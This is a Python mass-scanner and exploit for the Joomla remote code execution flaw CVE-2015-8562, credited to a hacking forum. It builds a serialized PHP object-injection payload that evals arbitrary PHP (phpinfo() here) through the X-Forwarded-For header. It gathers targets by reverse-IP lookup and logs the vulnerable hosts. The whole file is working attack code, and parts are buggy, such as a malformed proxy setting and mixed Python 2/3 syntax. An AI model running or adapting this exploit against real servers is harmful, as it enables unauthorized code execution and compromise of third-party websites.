'''
  joomla rce masschek for CVE-2015-8562
  https://spyhackerz.org/
  instagram.com/murrez.sec
'''
import sys
import re
import requests
import getopt
message = "--"
proxy = ("--proxy 91.194.77.112:65520")

def get_ip():
    ip = requests.get('http://icanhazip.com', proxies=proxy).content
    return ip
def get_url(url, user_agent):
   global message         
   headers = {
   #'User-Agent': user_agent   
   'x-forwarded-for': user_agent
   }
   response = None
   try:
     cookies = requests.get(url, timeout=15, headers=headers).cookies

     for _ in range(3):
       response = requests.get(url, timeout=15, headers=headers,cookies=cookies)   
   except Exception as ex:
     #print ex.message
     message = "Error: " + str(ex.message)
   if response:
     #print "got response"
     #print response.content
     return response.content
   return None
   
def php_str_noquotes(data):
  "Convert string to chr(xx).chr(xx) for use in php"
  encoded = ""
  for char in data:
        encoded += "chr({0}).".format(ord(char))
  return encoded[:-1]
def generate_payload(php_payload):
  php_payload = "eval({0})".format(php_str_noquotes(php_payload))
  terminate = '\xf0\xfd\xfd\xfd';
  exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
  injected_payload = "{};JFactory::getConfig();exit".format(php_payload)   
  exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
  exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
  return exploit_template
def get_site_list(domain):
   url = "http://viewdns.info/reverseip/?host=" + domain  + "&t=1"
   headers = {
   
   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'   
     
   }

   #print url
   try:
     response = requests.get(url, timeout=15, headers = headers)
     text =  response.content
     #print text
     sites = re.findall("<tr>\s+<td>(.*?)</td><td align=", text)
   except Exception as ex:
     print ("ex.message")
   return sites
   

def check_sites(site_list, pl, do_log, log_file):
   global message
   i = 1
   count = len(site_list)
   for site in site_list:
     site = site.strip()
     if(site.find("http://") == -1 ):
       host = "http://"+site
     else:
       host = site
     #print host
     resp = get_url(host ,pl)
     if resp != None:       
       lstr = ""
       m = re.search("phpinfo()", resp)
       if m:
        lstr = host + " exploitable"
       else :
         lstr =  host + " --"
     else:
       #print "error!"
       lstr = host + " " + message
       message = "--"
     print ("[") + str(i) + "/" + str(count) + "] "+ lstr
     i = i + 1
     if(do_log == True):
       log_file_handle = open(log_file, "a")
       log_file_handle.write(lstr+"\n")
       log_file_handle.close()

def usage():
   
   print ("Usage: "+sys.argv[0]+" "+"<options>")
   print ("Options:")
   print ("-d, --domain   domain for reverse lookup on viewdns.info")
   print ("-f, --file   file with site list to check")
   print ("-l, --log   save result to log file")
   print ("Example: "+sys.argv[0]+" --file domains.txt --log output.txt")




pl = generate_payload("phpinfo();")
#text = get_url(host, pl)

#write log?   
write_log = False
log_file = ""
domain = ""
read_file = ""
opts, args = getopt.getopt(sys.argv[1:], "f:d:l:", ["file=","domain=","log="]);

for opt, arg in opts:
   if opt in("-f", "--file"):
     read_file = arg
   elif opt in("-d", "--domain"):
     domain = arg
   elif opt in("-l", "--log"):
     log_file = arg
     write_log = True

if(domain and read_file):
   usage()
   exit()

if(domain == "" and read_file == ""):
   usage()
   exit()

if(write_log == True):
   
   fh = open(log_file, "w")
   fh.close()

#use file or get domains from viewdns.info

if(domain):
   sites = get_site_list(domain)
   #print sites
   print ("Total " +str(len(sites)) + " sites to check")
   check_sites(sites, pl, write_log, log_file)
elif(read_file):
   fh = open(read_file,"r")
   data = fh.readlines()
   fh.close()
   print ("Total " +str(len(data)) + " sites to check")
   check_sites(data, pl, write_log, log_file)